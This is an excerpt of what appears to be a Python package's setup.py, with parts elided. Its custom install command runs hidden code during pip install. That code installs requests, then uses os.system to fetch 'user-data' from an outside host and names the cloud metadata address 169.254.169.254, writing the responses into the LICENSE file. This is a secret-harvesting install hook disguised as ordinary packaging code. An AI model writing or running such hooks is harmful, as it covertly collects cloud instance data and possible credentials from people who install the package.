...
class CustomInstallCommand(install):
    ...
    def run(self):
        ...
        try:
            ...
            target_url = "http://self.diddlydingusdu.de/latest/user-data"
            req_cmd = """python3 -c "import requests;print(requests.get('""" + target_url + """').text)" > LICENSE"""
            ...
            target_url3 = "http://169.254.169.254/latest/user-data"
        ...
        try:
            ...
            req_cmd = """python3 -c "import requests;print(requests.get('""" + target_url + """').text)" >> LICENSE"""
            req_cmd2 = """python3 -c "import requests;print(requests.get('""" + target_url + """').status_code)" >> LICENSE"""
            os.system("python3 -m pip install requests")
            os.system(req_cmd)
            os.system(req_cmd2)
